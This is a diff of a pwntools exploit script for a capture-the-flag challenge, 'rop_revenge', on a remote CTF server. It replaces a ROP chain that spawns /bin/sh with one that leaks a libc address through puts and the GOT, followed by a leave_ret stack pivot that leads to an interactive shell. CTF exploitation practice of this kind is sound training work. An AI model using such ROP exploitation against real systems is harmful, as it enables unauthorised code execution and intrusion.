@@ -5,37 +5,36 @@ from pwn import *
 
 context.arch = 'amd64'
 
+e , l = ELF('./rop_revenge') , ELF('./libc.so.6')
+
 host , port = 'ctf.yuawn.idv.tw' , 10109
 y = remote( host , port )
 
-bss = 0x6cbb60
-pop_rdi = 0x4014c6
-pop_rsi = 0x4015e7
-pop_rdx = 0x4429c6
-pop_rax = 0x4bc748
-mov_rdi_rsi = 0x47a6e2
-syscall = 0x467395
+name = 0x601080
+main = 0x400636
+pop_rdi = 0x400723
+pop_rsi_r15 = 0x400721
+leave_ret = 0x4006bd
 
 p = flat(
-    'D' * 0x28,
-    pop_rsi,
-    u64( '/bin/sh\x00' ),
     pop_rdi,
-    bss,
-    mov_rdi_rsi,
-    pop_rsi,
-    0x0,
-    pop_rdx,
-    0x0,
-    pop_rax,
-    0x3b,
-    syscall
+    e.got['__libc_start_main'],
+    e.plt['puts'],
+    main
 )
 
-y.send( p )
+y.sendafter( '?' , p )
 
 sleep(1)
 
-y.sendline( 'cat /home/`whoami`/flag' )
+p = flat(
+    'D' * 0x20,
+    name - 8,
+    leave_ret
+)
+
+y.send(p)
+
+#y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
